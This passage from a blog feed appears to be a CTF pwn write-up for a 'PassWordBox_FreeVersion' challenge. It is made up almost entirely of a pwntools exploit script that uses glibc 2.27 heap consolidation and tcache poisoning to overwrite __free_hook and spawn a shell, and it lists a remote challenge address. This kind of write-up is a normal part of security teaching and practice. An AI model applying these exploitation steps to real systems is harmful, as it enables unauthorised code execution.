class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwdFree&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/wendy/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;119.3.81.43&#x27;</span>, <span class="number">49153</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,pwd</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;t Save:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Length Of Your Pwd:&#x27;</span>,<span class="built_in">str</span>(size)) <span class="comment">#&lt;=0x100</span></span><br><span class="line">    sla(<span class="string">&#x27;Your Pwd:&#x27;</span>,pwd)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,pwd</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index))</span><br><span class="line">    sd(pwd)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Want Check:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;2 Delete:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Save ID:&#x27;</span>)</span><br><span class="line">xor = (u64(sh.recv(<span class="number">8</span>)))^<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;xor&#x27;</span>,xor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x88</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>): <span class="comment">#5-11</span></span><br><span class="line">    add(i,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>): <span class="comment">#5-11</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64((<span class="number">0x100</span>+<span class="number">0x90</span>+<span class="number">0x90</span>)^xor)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>): <span class="comment">#5-11</span></span><br><span class="line">    add(i,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF0</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">libc_base = ((u64(sh.recv(<span class="number">8</span>)))^xor) - <span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>,<span class="string">&#x27;b\n&#x27;</span>) <span class="comment">#12==1</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x88</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x88</span>) </span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">12</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x80</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x80</span>,p64((<span class="number">0x4f432</span>+libc_base)^xor)+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x4f3d5 0x4f432 0x10a41c</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PassWordBox-FreeVersion&quot;&gt;&lt;a href=&quot;#PassWordBox-FreeVersion&quot; class=&quot;headerlink&quot; title=&quot;PassWordBox_FreeVersion&quot;&gt;&lt;/a&gt;&lt;strong&gt;PassWordB</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
